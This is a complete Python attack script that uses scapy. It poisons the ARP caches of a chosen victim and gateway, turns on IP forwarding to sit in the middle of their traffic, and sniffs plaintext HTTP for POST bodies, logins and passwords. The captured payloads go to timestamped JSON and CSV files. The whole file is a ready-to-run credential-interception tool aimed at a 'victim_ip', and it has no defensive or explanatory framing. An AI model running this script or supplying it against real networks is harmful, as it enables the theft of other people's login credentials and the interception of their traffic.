#!/usr/bin/env python3
import sys
import threading
import time
import json
import csv
from datetime import datetime
from scapy.all import ARP, Ether, send, sniff, IP, TCP, Raw, sr

captured_data = []  

# function that returns a mac address using an arp request
def get_mac(ip):
    ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=0)
    for sent, received in ans:
        return received.hwsrc
    return None

# function to spoof the victim by associating with the user’s mac address
def arp_spoof(victim_ip, victim_mac, spoof_ip):
    arp_response = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    send(arp_response, verbose=False)

# function to restore arp tables with mac address
def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac):
    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=False)

# main function that continuously sends spoofed arp replies
def mitm(victim_ip, gateway_ip):
    print("|*| Starting ARP spoofing... Press Ctrl+C to stop.")
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    if not victim_mac or not gateway_mac:
        print("|!| Could not find MAC addresses. Exiting.")
        sys.exit(1)
    try:
        while True:
            arp_spoof(victim_ip, victim_mac, gateway_ip)
            arp_spoof(gateway_ip, gateway_mac, victim_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("|*| Restoring ARP tables...")
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)

# function to make a callback on each packet and extract http details
def packet_sniffer(pkt):
    if pkt.haslayer(Raw) and pkt.haslayer(TCP):
        payload = pkt[Raw].load.decode(errors='ignore')
        if "POST" in payload or "login" in payload.lower() or "password" in payload.lower():
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst
            timestamp = datetime.now().isoformat()
            print(f"\n|*| Captured HTTP POST packet:")
            print(f"From {src_ip} to {dst_ip}")
            print(f"Payload:\n{payload}")
            print("=" * 50)

            captured_data.append({
                "timestamp": timestamp,
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "payload": payload
            })

# function to start sniffing tcp packets dependent on interface
def sniff_packets(interface):
    sniff(iface=interface, prn=packet_sniffer, store=False, filter="tcp port 80")

# function to save files to csv or json
def save_data_to_files():
    if not captured_data:
        print("|*| No data captured.")
        return

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    json_file = f"captured_{timestamp}.json"
    csv_file = f"captured_{timestamp}.csv"

    # to save as json
    with open(json_file, "w") as jf:
        json.dump(captured_data, jf, indent=4)
    print(f"[*] JSON data saved to {json_file}")

   # to save as csv
    with open(csv_file, "w", newline='') as cf:
        writer = csv.DictWriter(cf, fieldnames=["timestamp", "src_ip", "dst_ip", "payload"])
        writer.writeheader()
        for row in captured_data:
            writer.writerow(row)
    print(f"|*| CSV data saved to {csv_file}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: sudo python3 {sys.argv[0]} <victim_ip> <gateway_ip> <interface>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    interface = sys.argv[3]

    # enable ip forwarding
    print("|*| Enabling IP forwarding...")
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")

    try:
        threading.Thread(target=mitm, args=(victim_ip, gateway_ip), daemon=True).start()
        sniff_packets(interface)
    except KeyboardInterrupt:
        print("\n|*| Disabling IP forwarding...")
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
        save_data_to_files()
        print("|*| Exiting.")
        sys.exit(0)
